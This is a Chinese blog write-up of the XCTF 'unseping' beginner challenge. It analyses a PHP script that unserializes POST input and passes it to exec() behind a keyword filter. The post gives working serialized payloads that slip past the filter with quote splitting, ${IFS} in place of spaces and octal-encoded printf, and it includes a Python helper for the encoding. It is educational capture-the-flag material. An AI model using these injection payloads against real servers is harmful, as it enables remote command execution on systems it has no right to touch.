<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>攻防世界新手练习区——unseping - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="攻防世界新手练习区——unseping" />
<meta property="og:description" content="目录
知识点
解读题目源码：
命令绕过
知识点 PHP代码审计PHP序列化和反序列化PHP中魔术方法命令执行绕过方式 解读题目源码： 这道题首先一上来就是一段PHP代码，其中看到unserialize()就知道考的是反序列化，但是我们再往上看代码会发现还有命令执行绕过的知识点。做出这道题的第一步就是能够理清代码执行顺序和各个函数的功能。接下来我们先分析一下源码。
&lt;?php highlight_file(__FILE__); class ease{ private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ if (in_array($this-&gt;method, array(&#34;ping&#34;))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($ip){ exec($ip, $result); var_dump($result); } function waf($str){ if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&#34;, $str, $pat_array)) { return $str; } else { echo &#34;don&#39;t hack&#34;; } } function __wakeup(){ foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = $this-&gt;waf($v); } } } $ctf=@$_POST[&#39;ctf&#39;]; @unserialize(base64_decode($ctf)); ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/1150f245d60739ef8ea850015dff9b0c/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-21T19:59:41+08:00" />
<meta property="article:modified_time" content="2022-12-21T19:59:41+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">攻防世界新手练习区——unseping</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:0px;"></p> 
<p id="%E7%9F%A5%E8%AF%86%E7%82%B9-toc" style="margin-left:0px;"><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9" rel="nofollow">知识点</a></p> 
<p id="%E8%A7%A3%E8%AF%BB%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%EF%BC%9A-toc" style="margin-left:0px;"><a href="#%E8%A7%A3%E8%AF%BB%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%EF%BC%9A" rel="nofollow">解读题目源码：</a></p> 
<p id="%C2%A0%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#%C2%A0%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87" rel="nofollow"> 命令绕过</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="%E7%9F%A5%E8%AF%86%E7%82%B9">知识点</h2> 
<ul><li>PHP代码审计</li><li>PHP序列化和反序列化</li><li>PHP中魔术方法</li><li>命令执行绕过方式</li></ul> 
<h2 id="%E8%A7%A3%E8%AF%BB%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%EF%BC%9A">解读题目源码：</h2> 
<p>这道题首先一上来就是一段PHP代码，其中看到unserialize()就知道考的是反序列化，但是我们再往上看代码会发现还有命令执行绕过的知识点。做出这道题的第一步就是能够理清代码执行顺序和各个函数的功能。接下来我们先分析一下源码。</p> 
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
 
    function __destruct(){
        if (in_array($this-&gt;method, array("ping"))) {
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this-&gt;args as $k =&gt; $v) {
            $this-&gt;args[$k] = $this-&gt;waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?&gt;</code></pre> 
<blockquote> 
 <ul><li>__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</li><li>__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。<strong>这道题中发序列化之后就会触发析构函数</strong>。</li><li>in_array()函数：</li></ul> 
 <p><img alt="" height="1032" src="https://images2.imgbox.com/73/00/dV0e2gYB_o.png" width="1200"></p> 
 <p></p> 
 <ul><li>call_user_func_array()函数：</li></ul> 
 <p><img alt="" height="1039" src="https://images2.imgbox.com/d3/60/VSeiobfI_o.png" width="1156"></p> 
 <ul><li> exec()函数</li></ul> 
 <p><img alt="" height="627" src="https://images2.imgbox.com/46/f1/my0VHfTN_o.png" width="1171"></p> 
 <ul><li> var_dump()：用于输出变量的详细信息，包括值和类型等</li><li>preg_match_all()：用于执行一个全局正则表达式匹配</li></ul> 
 <p><img alt="" height="987" src="https://images2.imgbox.com/5d/88/VhNN5x6a_o.png" width="1200"></p> 
 <ul><li> __wakeup()函数： <p>unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</p> <p>预先准对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p> </li><li> <p>foreach()函数：</p> </li></ul> 
 <p><img alt="" height="304" src="https://images2.imgbox.com/e5/27/lgTfwqRA_o.png" width="1094"></p> 
 <p> 执行顺序：</p> 
 <ol><li>以POST方式提交ctf</li><li>对提交的值进行base64解码</li><li>进行反序列化</li><li>然后执行__wakeup()函数</li><li>执行析构函数_destruct()</li></ol> 
</blockquote> 
<p>能够看懂代码之后我们就可以开始进行尝试。由于我们是需要查看当前目录，寻找一下是否有flag的文件提示，但是有一个waf函数进行过滤，所以我们不能直接传参为ls。这就需要我们的命令执行绕过方式了。</p> 
<p>我们可以检验上面我们的思路是否正确。</p> 
<pre><code class="language-php">&lt;?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
     
}

$o=new ease("ping",array("ifconfig"));
$s = serialize($o);
echo base64_encode($s);
?&gt;</code></pre> 
<p>将上述代码结果以post形式提交进去。</p> 
<p><img alt="" height="427" src="https://images2.imgbox.com/e5/dd/LA6FyQ1L_o.png" width="1200"></p> 
<p>这时候我们发现页面返回了结果：</p> 
<p><img alt="" height="888" src="https://images2.imgbox.com/d7/a8/UYB7KjmM_o.png" width="1200"></p> 
<p>这就说明我们整体思路是没有问题的，直接使用命令绕过方法寻找Flag。</p> 
<h2 id="%C2%A0%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"> 命令绕过</h2> 
<p>上面检验命令是可以执行的，我们接下来思路就放在命令执行绕过过滤即可，寻找flag线索。</p> 
<ul><li>单引号</li><li>双引号</li><li>${Z}</li></ul> 
<p><img alt="" height="361" src="https://images2.imgbox.com/a8/54/38JvoSxY_o.png" width="1200"></p> 
<pre><code class="language-php">&lt;?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
     
}

$o=new ease("ping",array('l""s'));
$s = serialize($o);
echo base64_encode($s);
?&gt;</code></pre> 
<p> 将上述结果提交。</p> 
<p><img alt="" height="534" src="https://images2.imgbox.com/5a/7e/5ySEXzDY_o.png" width="1200"></p> 
<p>看到了"flag_1s_here”文件夹，于是我们查看一下该文件夹下目录；于是执行命令"ls flag_1s_here"；<strong><span style="color:#fe2c24;">此处空格用${<!-- --><a href="https://so.csdn.net/so/search?q=IFS&amp;spm=1001.2101.3001.7020" title="IFS">IFS</a>}绕过。</span></strong> </p> 
<pre><code class="language-php">&lt;?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
     
}

$o=new ease("ping",array('l""s${IFS}f""lag_1s_here'));
$s = serialize($o);
echo base64_encode($s);
?&gt;</code></pre> 
<p><img alt="" height="446" src="https://images2.imgbox.com/d3/33/dqFKlu4E_o.png" width="1200"></p> 
<p>于是我们通过命令查看该文件；命令cat flag_1s_here/flag_831b69012c67b35f.php。</p> 
<p><span style="color:#fe2c24;">/绕过方式：<strong>利用oct编码（八进制）绕过；$(printf "\154\163")//ls命令</strong></span></p> 
<p><span style="color:#0d0016;">通过python脚本实现oct绕过：</span></p> 
<pre><code class="language-python">str1 = "cat flag_1s_here/flag_831b69012c67b35f.php"
arr = []
for i in str1:
    #对字符先转换为ASCII码，再转换为八进制
    r = oct(ord(i))
    #这个主要是为了将八进制前面的0o替换掉
    r=str(r).replace("0o","")
    arr.append(r)
s = "\\"
# print(arr)
#将所有的八进制组合，最终的结果第一个地方应该再添加一个\
p=s.join(arr)
print(p)
</code></pre> 
<p><span style="color:#0d0016;">将其结果带入命令那执行，代码如下：</span></p> 
<pre><code class="language-php">&lt;?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
     
}
$o=new ease("ping",array('$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'));
$s = serialize($o);

echo base64_encode($s);
?&gt;
</code></pre> 
<p><span style="color:#0d0016;">代入显示Flag：</span></p> 
<p><img alt="" height="519" src="https://images2.imgbox.com/44/aa/I6cIoWoE_o.png" width="1200"></p> 
<p></p> 
<p><span style="color:#fe2c24;"> </span></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/6fc7c94ffd336cda62c700ef40231507/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【c&#43;&#43;】友元函数</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/70bd35d58b29514db1e82c29464c599e/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">1.CSS-属性和选择器</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>